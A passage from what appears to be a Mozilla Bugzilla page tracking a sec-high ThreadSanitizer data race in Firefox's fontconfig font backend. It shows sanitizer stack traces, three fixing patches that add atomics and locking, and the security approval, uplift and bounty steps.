    #3 gfxFontconfigFontEntry::CreateFontInstance(gfxFontStyle const*) /builds/worker/checkouts/gecko/gfx/thebes/gfxFcPlatformFontList.cpp:859:31 (libxul.so+0x5917036) (BuildId: 9ee4bdacd12c56311ad459908123f344c17c0ace)
    #4 gfxFontEntry::FindOrMakeFont(gfxFontStyle const*, gfxCharacterMap*) /builds/worker/checkouts/gecko/gfx/thebes/gfxFontEntry.cpp:266:22 (libxul.so+0x5947cfe) (BuildId: 9ee4bdacd12c56311ad459908123f344c17c0ace)

```

I guess the root of the problem here is that the `mFTFace` and `mFTFaceInitialized` members of `gfxFontconfigFontEntry` are not guarded or atomic, so we have a problem if two threads call GetFTFace() on the same (not-yet-initialized) entry at the same time.

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1824200#c1)• 2 years ago |
|  | |

Attached file
[Bug 1824200 - Make mFTFace an atomic pointer. r=lsalzman](attachment.cgi?id=9325039)
— [Details](attachment.cgi?id=9325039&action=edit)

|  | [Phabricator Automation](/user_profile?user_id=600971) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1824200#a153827_600971)• 2 years ago |

Assignee: nobody → jfkthameStatus: NEW → ASSIGNED

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1824200#c2)• 2 years ago |
|  | |

Tyson, could you please test whether this patch resolves the race? I believe it should, but I haven't been able to verify locally because currently my tsan build is insta-failing with an issue somewhere inside GTK before it reaches any of this code.

(Maybe updating various components on my system will help....)

Flags: needinfo?(twsmith)

|  | [Tyson Smith [:tsmith]](/user_profile?user_id=486634) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1824200#c3)• 2 years ago |
|  | |

Attached file
[post-patch-tsan.txt](attachment.cgi?id=9325057)
— [Details](attachment.cgi?id=9325057&action=edit)

With the patch applied I see:

```
WARNING: ThreadSanitizer: data race (pid=769123)
  Read of size 1 at 0x7b5400001fee by thread T23:
    #0 gfxFontconfigFontEntry::HasVariations() mozilla-central/gfx/thebes/gfxFcPlatformFontList.cpp:970:7 (libxul.so+0x61220a0) (BuildId: a58f95ae75e917c5002f73f6198d7392)
    #1 gfxFontconfigFontEntry::CreateFontInstance(gfxFontStyle const*) mozilla-central/gfx/thebes/gfxFcPlatformFontList.cpp:869:7 (libxul.so+0x61211d3) (BuildId: a58f95ae75e917c5002f73f6198d7392)
    #2 gfxFontEntry::FindOrMakeFont(gfxFontStyle const*, gfxCharacterMap*) mozilla-central/gfx/thebes/gfxFontEntry.cpp:266:22 (libxul.so+0x6151e4e) (BuildId: a58f95ae75e917c5002f73f6198d7392)
    #3 gfxFontGroup::GetFontAt(int, unsigned int, bool*) mozilla-central/gfx/thebes/gfxTextRun.cpp:2061:16 (libxul.so+0x61e4e54) (BuildId: a58f95ae75e917c5002f73f6198d7392)
    #4 gfxFontGroup::GetFirstValidFont(unsigned int, mozilla::StyleGenericFontFamily*, bool*) mozilla-central/gfx/thebes/gfxTextRun.cpp:2316:12 (libxul.so+0x61e5f9b) (BuildId: a58f95ae75e917c5002f73f6198d7392)
    #5 mozilla::dom::CanvasRenderingContext2D::DrawOrMeasureText(nsTSubstring<char16_t> const&, float, float, mozilla::dom::Optional<double> const&, mozilla::dom::CanvasRenderingContext2D::TextDrawOperation, mozilla::ErrorResult&) mozilla-central/dom/canvas/CanvasRenderingContext2D.cpp:4304:46 (libxul.so+0x7ac434b) (BuildId: a58f95ae75e917c5002f73f6198d7392)
    #6 mozilla::dom::CanvasRenderingContext2D::FillText(nsTSubstring<char16_t> const&, double, double, mozilla::dom::Optional<double> const&, mozilla::ErrorResult&) mozilla-central/dom/canvas/CanvasRenderingContext2D.cpp:3864:37 (libxul.so+0x7ac39e3) (BuildId: a58f95ae75e917c5002f73f6198d7392)
    #7 mozilla::dom::OffscreenCanvasRenderingContext2D_Binding::fillText(JSContext*, JS::Handle<JSObject*>, void*, JSJitMethodCallArgs const&) mozilla-central/objdir-ff-tsan/dom/bindings/OffscreenCanvasRenderingContext2DBinding.cpp:3904:24 (libxul.so+0x6d02d08) (BuildId: a58f95ae75e917c5002f73f6198d7392)
    #8 bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*) mozilla-central/dom/bindings/BindingUtils.cpp:3318:13 (libxul.so+0x79f7154) (BuildId: a58f95ae75e917c5002f73f6198d7392)
    #9 CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), js::CallReason, JS::CallArgs const&) mozilla-central/js/src/vm/Interpreter.cpp:459:13 (libxul.so+0xc96ad0e) (BuildId: a58f95ae75e917c5002f73f6198d7392)
    ...

  Previous write of size 1 at 0x7b5400001fee by thread T20:
    #0 gfxFontconfigFontEntry::HasVariations() mozilla-central/gfx/thebes/gfxFcPlatformFontList.cpp:973:29 (libxul.so+0x61220c0) (BuildId: a58f95ae75e917c5002f73f6198d7392)
    #1 gfxFontconfigFontEntry::CreateFontInstance(gfxFontStyle const*) mozilla-central/gfx/thebes/gfxFcPlatformFontList.cpp:869:7 (libxul.so+0x61211d3) (BuildId: a58f95ae75e917c5002f73f6198d7392)
    #2 gfxFontEntry::FindOrMakeFont(gfxFontStyle const*, gfxCharacterMap*) mozilla-central/gfx/thebes/gfxFontEntry.cpp:266:22 (libxul.so+0x6151e4e) (BuildId: a58f95ae75e917c5002f73f6198d7392)
    #3 gfxFontGroup::GetFontAt(int, unsigned int, bool*) mozilla-central/gfx/thebes/gfxTextRun.cpp:2061:16 (libxul.so+0x61e4e54) (BuildId: a58f95ae75e917c5002f73f6198d7392)
    #4 gfxFontGroup::GetFirstValidFont(unsigned int, mozilla::StyleGenericFontFamily*, bool*) mozilla-central/gfx/thebes/gfxTextRun.cpp:2316:12 (libxul.so+0x61e5f9b) (BuildId: a58f95ae75e917c5002f73f6198d7392)
    #5 mozilla::dom::CanvasRenderingContext2D::DrawOrMeasureText(nsTSubstring<char16_t> const&, float, float, mozilla::dom::Optional<double> const&, mozilla::dom::CanvasRenderingContext2D::TextDrawOperation, mozilla::ErrorResult&) mozilla-central/dom/canvas/CanvasRenderingContext2D.cpp:4304:46 (libxul.so+0x7ac434b) (BuildId: a58f95ae75e917c5002f73f6198d7392)
    #6 mozilla::dom::CanvasRenderingContext2D::FillText(nsTSubstring<char16_t> const&, double, double, mozilla::dom::Optional<double> const&, mozilla::ErrorResult&) mozilla-central/dom/canvas/CanvasRenderingContext2D.cpp:3864:37 (libxul.so+0x7ac39e3) (BuildId: a58f95ae75e917c5002f73f6198d7392)
    #7 mozilla::dom::OffscreenCanvasRenderingContext2D_Binding::fillText(JSContext*, JS::Handle<JSObject*>, void*, JSJitMethodCallArgs const&) mozilla-central/objdir-ff-tsan/dom/bindings/OffscreenCanvasRenderingContext2DBinding.cpp:3904:24 (libxul.so+0x6d02d08) (BuildId: a58f95ae75e917c5002f73f6198d7392)
    #8 bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*) mozilla-central/dom/bindings/BindingUtils.cpp:3318:13 (libxul.so+0x79f7154) (BuildId: a58f95ae75e917c5002f73f6198d7392)
    #9 CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), js::CallReason, JS::CallArgs const&) mozilla-central/js/src/vm/Interpreter.cpp:459:13 (libxul.so+0xc96ad0e) (BuildId: a58f95ae75e917c5002f73f6198d7392)
    ...

```
Flags: needinfo?(twsmith)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1824200#a229462_1689)• 2 years ago |

Keywords: [sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1824200#c4)• 2 years ago |
|  | |

(In reply to Tyson Smith [:tsmith] from [comment #3](/show_bug.cgi?id=1824200#c3 "RESOLVED FIXED - [tsan] data race initializing the SharedFTFace in gfxFontconfigFontEntry::GetFTFace"))

> Created [attachment 9325057](/attachment.cgi?id=9325057 "post-patch-tsan.txt") [[details]](/attachment.cgi?id=9325057&action=edit "post-patch-tsan.txt")
>
> post-patch-tsan.txt
>
> With the patch applied I see:
>
> ```
> WARNING: ThreadSanitizer: data race (pid=769123)
>   Read of size 1 at 0x7b5400001fee by thread T23:
>     #0 gfxFontconfigFontEntry::HasVariations() mozilla-central/gfx/thebes/gfxFcPlatformFontList.cpp:970:7 (libxul.so+0x61220a0) (BuildId: a58f95ae75e917c5002f73f6198d7392)
>     #1 gfxFontconfigFontEntry::CreateFontInstance(gfxFontStyle const*) mozilla-central/gfx/thebes/gfxFcPlatformFontList.cpp:869:7 (libxul.so+0x61211d3) (BuildId: a58f95ae75e917c5002f73f6198d7392)
>
> ```

Cool, thanks -- that makes sense, and should be fixable. So the patch here does eliminate the race on the SharedFTFace, and now we're seeing a further issue.

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1824200#c5)• 2 years ago |
|  | |

Attached file
[Bug 1824200 - Also make the has-variations state atomic. r=lsalzman](attachment.cgi?id=9325073)
— [Details](attachment.cgi?id=9325073&action=edit)

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1824200#c6)• 2 years ago |
|  | |

OK, the second patch should also fix the issue with HasVariations, I hope. When you have a chance, could you please verify (and let me know what we hit next, if anything!) -- Thanks!

Flags: needinfo?(twsmith)

|  | [Tyson Smith [:tsmith]](/user_profile?user_id=486634) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1824200#c7)• 2 years ago |
|  | |

Attached file
[post-patch-tsan-2.txt](attachment.cgi?id=9325076)
— [Details](attachment.cgi?id=9325076&action=edit)

Of course :)

Here is the next report I see:

```
WARNING: ThreadSanitizer: data race (pid=775797)
  Read of size 8 at 0x7b5400001ff0 by thread T21:
    #0 RefPtr<mozilla::detail::ThreadSafeWeakReference>::operator!() const /home/twsmith/code/mozilla-central/objdir-ff-tsan/dist/include/mozilla/RefPtr.h:350:36 (libxul.so+0x61209b6) (BuildId: c5de7b8857d52e0edd7d01649db45e11)
    #1 mozilla::ThreadSafeWeakPtr<mozilla::gfx::UnscaledFontFontconfig>::getRefPtr() const /home/twsmith/code/mozilla-central/objdir-ff-tsan/dist/include/mozilla/ThreadSafeWeakPtr.h:277:9 (libxul.so+0x61209b6)
    #2 mozilla::ThreadSafeWeakPtr<mozilla::gfx::UnscaledFontFontconfig>::operator RefPtr<mozilla::gfx::UnscaledFontFontconfig>() const /home/twsmith/code/mozilla-central/objdir-ff-tsan/dist/include/mozilla/ThreadSafeWeakPtr.h:272:48 (libxul.so+0x61209b6)
    #3 gfxFontconfigFontEntry::UnscaledFontCache::Lookup(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>> const&, unsigned int) /home/twsmith/code/mozilla-central/gfx/thebes/gfxFcPlatformFontList.cpp:805:42 (libxul.so+0x61209b6)
    #4 gfxFontconfigFontEntry::CreateFontInstance(gfxFontStyle const*) /home/twsmith/code/mozilla-central/gfx/thebes/gfxFcPlatformFontList.cpp:925:26 (libxul.so+0x6121903) (BuildId: c5de7b8857d52e0edd7d01649db45e11)
    #5 gfxFontEntry::FindOrMakeFont(gfxFontStyle const*, gfxCharacterMap*) /home/twsmith/code/mozilla-central/gfx/thebes/gfxFontEntry.cpp:266:22 (libxul.so+0x6151b0e) (BuildId: c5de7b8857d52e0edd7d01649db45e11)
    #6 gfxFontGroup::GetFontAt(int, unsigned int, bool*) /home/twsmith/code/mozilla-central/gfx/thebes/gfxTextRun.cpp:2061:16 (libxul.so+0x61e4b14) (BuildId: c5de7b8857d52e0edd7d01649db45e11)
    #7 gfxFontGroup::GetFirstValidFont(unsigned int, mozilla::StyleGenericFontFamily*, bool*) /home/twsmith/code/mozilla-central/gfx/thebes/gfxTextRun.cpp:2316:12 (libxul.so+0x61e5c5b) (BuildId: c5de7b8857d52e0edd7d01649db45e11)
    #8 mozilla::dom::CanvasRenderingContext2D::DrawOrMeasureText(nsTSubstring<char16_t> const&, float, float, mozilla::dom::Optional<double> const&, mozilla::dom::CanvasRenderingContext2D::TextDrawOperation, mozilla::ErrorResult&) /home/twsmith/code/mozilla-central/dom/canvas/CanvasRenderingContext2D.cpp:4304:46 (libxul.so+0x7ac400b) (BuildId: c5de7b8857d52e0edd7d01649db45e11)
    #9 mozilla::dom::CanvasRenderingContext2D::FillText(nsTSubstring<char16_t> const&, double, double, mozilla::dom::Optional<double> const&, mozilla::ErrorResult&) /home/twsmith/code/mozilla-central/dom/canvas/CanvasRenderingContext2D.cpp:3864:37 (libxul.so+0x7ac36a3) (BuildId: c5de7b8857d52e0edd7d01649db45e11)
    #10 mozilla::dom::OffscreenCanvasRenderingContext2D_Binding::fillText(JSContext*, JS::Handle<JSObject*>, void*, JSJitMethodCallArgs const&) /home/twsmith/code/mozilla-central/objdir-ff-tsan/dom/bindings/OffscreenCanvasRenderingContext2DBinding.cpp:3904:24 (libxul.so+0x6d029c8) (BuildId: c5de7b8857d52e0edd7d01649db45e11)
...

  Previous write of size 8 at 0x7b5400001ff0 by thread T20:
    #0 RefPtr<mozilla::detail::ThreadSafeWeakReference>::assign_assuming_AddRef(mozilla::detail::ThreadSafeWeakReference*) /home/twsmith/code/mozilla-central/objdir-ff-tsan/dist/include/mozilla/RefPtr.h:71:13 (libxul.so+0x6121d08) (BuildId: c5de7b8857d52e0edd7d01649db45e11)
    #1 RefPtr<mozilla::detail::ThreadSafeWeakReference>& RefPtr<mozilla::detail::ThreadSafeWeakReference>::operator=<mozilla::detail::ThreadSafeWeakReference, void>(RefPtr<mozilla::detail::ThreadSafeWeakReference>&&) /home/twsmith/code/mozilla-central/objdir-ff-tsan/dist/include/mozilla/RefPtr.h:239:5 (libxul.so+0x6121d08)
    #2 mozilla::ThreadSafeWeakPtr<mozilla::gfx::UnscaledFontFontconfig>::operator=(mozilla::ThreadSafeWeakPtr<mozilla::gfx::UnscaledFontFontconfig>&&) /home/twsmith/code/mozilla-central/objdir-ff-tsan/dist/include/mozilla/ThreadSafeWeakPtr.h:212:68 (libxul.so+0x6121d08)
    #3 gfxFontconfigFontEntry::UnscaledFontCache::MoveToFront(unsigned long) /home/twsmith/code/mozilla-central/gfx/thebes/gfxFcPlatformFontList.cpp:797:23 (libxul.so+0x6121d08)
    #4 gfxFontconfigFontEntry::UnscaledFontCache::Add(RefPtr<mozilla::gfx::UnscaledFontFontconfig> const&) /home/twsmith/code/mozilla-central/gfx/thebes/gfxFcPlatformFontList.h:157:7 (libxul.so+0x6121d08)
    #5 gfxFontconfigFontEntry::CreateFontInstance(gfxFontStyle const*) /home/twsmith/code/mozilla-central/gfx/thebes/gfxFcPlatformFontList.cpp:933:24 (libxul.so+0x6121d08)
    #6 gfxFontEntry::FindOrMakeFont(gfxFontStyle const*, gfxCharacterMap*) /home/twsmith/code/mozilla-central/gfx/thebes/gfxFontEntry.cpp:266:22 (libxul.so+0x6151b0e) (BuildId: c5de7b8857d52e0edd7d01649db45e11)
    #7 gfxFontGroup::GetFontAt(int, unsigned int, bool*) /home/twsmith/code/mozilla-central/gfx/thebes/gfxTextRun.cpp:2061:16 (libxul.so+0x61e4b14) (BuildId: c5de7b8857d52e0edd7d01649db45e11)
    #8 gfxFontGroup::GetFirstValidFont(unsigned int, mozilla::StyleGenericFontFamily*, bool*) /home/twsmith/code/mozilla-central/gfx/thebes/gfxTextRun.cpp:2316:12 (libxul.so+0x61e5c5b) (BuildId: c5de7b8857d52e0edd7d01649db45e11)
    #9 mozilla::dom::CanvasRenderingContext2D::DrawOrMeasureText(nsTSubstring<char16_t> const&, float, float, mozilla::dom::Optional<double> const&, mozilla::dom::CanvasRenderingContext2D::TextDrawOperation, mozilla::ErrorResult&) /home/twsmith/code/mozilla-central/dom/canvas/CanvasRenderingContext2D.cpp:4304:46 (libxul.so+0x7ac400b) (BuildId: c5de7b8857d52e0edd7d01649db45e11)
    #10 mozilla::dom::CanvasRenderingContext2D::FillText(nsTSubstring<char16_t> const&, double, double, mozilla::dom::Optional<double> const&, mozilla::ErrorResult&) /home/twsmith/code/mozilla-central/dom/canvas/CanvasRenderingContext2D.cpp:3864:37 (libxul.so+0x7ac36a3) (BuildId: c5de7b8857d52e0edd7d01649db45e11)
...

```
Flags: needinfo?(twsmith)

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1824200#c8)• 2 years ago |
|  | |

Attached file
[Bug 1824200 - Lock around access to mUnscaledFontCache. r=lsalzman](attachment.cgi?id=9325078)
— [Details](attachment.cgi?id=9325078&action=edit)

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1824200#c9)• 2 years ago |
|  | |

Same again :) Thanks!

Flags: needinfo?(twsmith)

|  | [Tyson Smith [:tsmith]](/user_profile?user_id=486634) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1824200#c10)• 2 years ago |
|  | |

Success! No issues are reported with the three patches applied :)

Flags: needinfo?(twsmith)

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1824200#c11)• 2 years ago |
|  | |

Updating status flags, not sure how they all got set to "fixed"!

[status-firefox111](/buglist.cgi?f1=cf_status_firefox111&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox111&o1=equals&v1=wontfix)
[status-firefox112](/buglist.cgi?f1=cf_status_firefox112&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox112&o1=equals&v1=affected)
[status-firefox-esr102](/buglist.cgi?f1=cf_status_firefox_esr102&o1=isnotempty):
--- → [unaffected](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=unaffected)
[status-thunderbird\_esr102](/buglist.cgi?f1=cf_status_thunderbird_esr102&o1=isnotempty):
--- → [unaffected](/buglist.cgi?f1=cf_status_thunderbird_esr102&o1=equals&v1=unaffected)
[status-thunderbird\_esr91](/buglist.cgi?f1=cf_status_thunderbird_esr91&o1=isnotempty):
--- → [unaffected](/buglist.cgi?f1=cf_status_thunderbird_esr91&o1=equals&v1=unaffected)

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1824200#c12)• 2 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1824200&comment_id=16344786 "1 revision") |
|  | |

Comment on [attachment 9325039](/attachment.cgi?id=9325039 "Bug 1824200 - Make mFTFace an atomic pointer. r=lsalzman") [[details]](/attachment.cgi?id=9325039&action=edit "Bug 1824200 - Make mFTFace an atomic pointer. r=lsalzman")

[Bug 1824200](/show_bug.cgi?id=1824200 "RESOLVED FIXED - [tsan] data race initializing the SharedFTFace in gfxFontconfigFontEntry::GetFTFace") - Make mFTFace an atomic pointer. r=lsalzman

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: Probably not easy - data races detected by tsan, but it's unclear how they could be exploited
* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: No
* **Which older supported branches are affected by this flaw?**: 105+
* **If not all supported branches, which bug introduced the flaw?**: None
* **Do you have backports for the affected branches?**: No
* **If not, how different, hard to create, and risky will they be?**: Should be straightforward
* **How likely is this patch to cause regressions; how much testing does it need?**: low risk, just making more things atomic/locked
* **Is Android affected?**: No
[Attachment #9325039](/attachment.cgi?id=9325039&action=edit "Bug 1824200 - Make mFTFace an atomic pointer. r=lsalzman") -
Flags: sec-approval?

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1824200#a333272_329583)• 2 years ago |

[Attachment #9325073](/attachment.cgi?id=9325073&action=edit "Bug 1824200 - Also make the has-variations state atomic. r=lsalzman") -
Flags: sec-approval?
[Attachment #9325078](/attachment.cgi?id=9325078&action=edit "Bug 1824200 - Lock around access to mUnscaledFontCache. r=lsalzman") -
Flags: sec-approval?

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1824200#a430327_75935)• 2 years ago |

[status-thunderbird\_esr102](/buglist.cgi?f1=cf_status_thunderbird_esr102&o1=isnotempty):
[unaffected](/buglist.cgi?f1=cf_status_thunderbird_esr102&o1=equals&v1=unaffected) → ---
[status-thunderbird\_esr91](/buglist.cgi?f1=cf_status_thunderbird_esr91&o1=isnotempty):
[unaffected](/buglist.cgi?f1=cf_status_thunderbird_esr91&o1=equals&v1=unaffected) → ---
[tracking-firefox112](/buglist.cgi?f1=cf_tracking_firefox112&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox112&o1=equals&v1=%2B)
[tracking-firefox113](/buglist.cgi?f1=cf_tracking_firefox113&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox113&o1=equals&v1=%2B)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1824200#c13)• 2 years ago |
|  | |

Comment on [attachment 9325078](/attachment.cgi?id=9325078 "Bug 1824200 - Lock around access to mUnscaledFontCache. r=lsalzman") [[details]](/attachment.cgi?id=9325078&action=edit "Bug 1824200 - Lock around access to mUnscaledFontCache. r=lsalzman")

[Bug 1824200](/show_bug.cgi?id=1824200 "RESOLVED FIXED - [tsan] data race initializing the SharedFTFace in gfxFontconfigFontEntry::GetFTFace") - Lock around access to mUnscaledFontCache. r=lsalzman

Approved to request uplift and land

[Attachment #9325078](/attachment.cgi?id=9325078&action=edit "Bug 1824200 - Lock around access to mUnscaledFontCache. r=lsalzman") -
Flags: sec-approval? → sec-approval+

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1824200#a430903_578488)• 2 years ago |

[Attachment #9325073](/attachment.cgi?id=9325073&action=edit "Bug 1824200 - Also make the has-variations state atomic. r=lsalzman") -
Flags: sec-approval? → sec-approval+

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1824200#a430906_578488)• 2 years ago |

[Attachment #9325039](/attachment.cgi?id=9325039&action=edit "Bug 1824200 - Make mFTFace an atomic pointer. r=lsalzman") -
Flags: sec-approval? → sec-approval+

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1824200#c14)• 2 years ago |
|  | |

Comment on [attachment 9325039](/attachment.cgi?id=9325039 "Bug 1824200 - Make mFTFace an atomic pointer. r=lsalzman") [[details]](/attachment.cgi?id=9325039&action=edit "Bug 1824200 - Make mFTFace an atomic pointer. r=lsalzman")

[Bug 1824200](/show_bug.cgi?id=1824200 "RESOLVED FIXED - [tsan] data race initializing the SharedFTFace in gfxFontconfigFontEntry::GetFTFace") - Make mFTFace an atomic pointer. r=lsalzman

### Beta/Release Uplift Approval Request

* **User impact if declined**: Potential data races in fontconfig font backend, could result in crashes or maybe other issues.
* **Is this code covered by automated tests?**: Yes
* **Has the fix been verified in Nightly?**: No
* **Needs manual test from QE?**: No
* **If yes, steps to reproduce**: (No known STR to produce user-visible issues, only observed via tsan warnings.)
* **List of other uplifts needed**: None
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: Just making some vars atomic, adding locking - no substantial logic changes.
* **String changes made/needed**: none
* **Is Android affected?**: No
[Attachment #9325039](/attachment.cgi?id=9325039&action=edit "Bug 1824200 - Make mFTFace an atomic pointer. r=lsalzman") -
Flags: approval-mozilla-beta?

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1824200#a443712_329583)• 2 years ago |

[Attachment #9325073](/attachment.cgi?id=9325073&action=edit "Bug 1824200 - Also make the has-variations state atomic. r=lsalzman") -
Flags: approval-mozilla-beta?
[Attachment #9325078](/attachment.cgi?id=9325078&action=edit "Bug 1824200 - Lock around access to mUnscaledFontCache. r=lsalzman") -
Flags: approval-mozilla-beta?

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1824200#c15)• 2 years ago |
|  | |

Make mFTFace an atomic pointer. r=lsalzman

<https://hg.mozilla.org/mozilla-central/rev/5947eeacabce>

Also make the has-variations state atomic. r=lsalzman

<https://hg.mozilla.org/mozilla-central/rev/785d7c9a0341>

Lock around access to mUnscaledFontCache. r=lsalzman

<https://hg.mozilla.org/mozilla-central/rev/478e795d42d7>

Group: gfx-core-security → core-security-releaseStatus: ASSIGNED → RESOLVEDClosed: 2 years ago
[status-firefox113](/buglist.cgi?f1=cf_status_firefox113&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox113&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox113&o1=equals&v1=fixed)Resolution: --- → FIXED

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1824200#a498418_580382)• 2 years ago |

Target Milestone: --- → 113 Branch

|  | [Dianna Smith [:diannaS]](/user_profile?user_id=690067) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1824200#c16)• 2 years ago |
|  | |

Comment on [attachment 9325039](/attachment.cgi?id=9325039 "Bug 1824200 - Make mFTFace an atomic pointer. r=lsalzman") [[details]](/attachment.cgi?id=9325039&action=edit "Bug 1824200 - Make mFTFace an atomic pointer. r=lsalzman")

[Bug 1824200](/show_bug.cgi?id=1824200 "RESOLVED FIXED - [tsan] data race initializing the SharedFTFace in gfxFontconfigFontEntry::GetFTFace") - Make mFTFace an atomic pointer. r=lsalzman

Approved for 112.0b9

[Attachment #9325039](/attachment.cgi?id=9325039&action=edit "Bug 1824200 - Make mFTFace an atomic pointer. r=lsalzman") -
Flags: approval-mozilla-beta? → approval-mozilla-beta+

|  | [Dianna Smith [:diannaS]](/user_profile?user_id=690067) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1824200#a587856_690067)• 2 years ago |

[Attachment #9325073](/attachment.cgi?id=9325073&action=edit "Bug 1824200 - Also make the has-variations state atomic. r=lsalzman") -
Flags: approval-mozilla-beta? → approval-mozilla-beta+

|  | [Dianna Smith [:diannaS]](/user_profile?user_id=690067) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1824200#a587863_690067)• 2 years ago |

[Attachment #9325078](/attachment.cgi?id=9325078&action=edit "Bug 1824200 - Lock around access to mUnscaledFontCache. r=lsalzman") -
Flags: approval-mozilla-beta? → approval-mozilla-beta+

|  | [Dianna Smith [:diannaS]](/user_profile?user_id=690067) |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1824200#c17)• 2 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-beta/rev/170675359f57>

<https://hg.mozilla.org/releases/mozilla-beta/rev/a6b3b4299574>

<https://hg.mozilla.org/releases/mozilla-beta/rev/977a487ffc79>

[status-firefox112](/buglist.cgi?f1=cf_status_firefox112&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox112&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox112&o1=equals&v1=fixed)

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1824200#a595847_329583)• 2 years ago |

See Also: → [1825569](/show_bug.cgi?id=1825569 "RESOLVED FIXED - [tsan] data races in Android font backend (FT2FontEntry)")

|  | [Brindusa Tot, Desktop QA](/user_profile?user_id=553429) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1824200#a1027687_553429)• 2 years ago |

Flags: qe-verify-Whiteboard: [post-critsmash-triage]

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1824200#c18)• 2 years ago |
|  | |

Since these races were found using a testcase on a bug bounty submission we are adding a bonus bounty for each.

Flags: sec-bounty+

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1824200#a1113464_578488)• 2 years ago |

Whiteboard: [post-critsmash-triage] → [post-critsmash-triage][adv-main112+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1824200#c19)• 2 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9327571)
— [Details](attachment.cgi?id=9327571&action=edit)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1824200#a18006738_1689)• 1 year ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
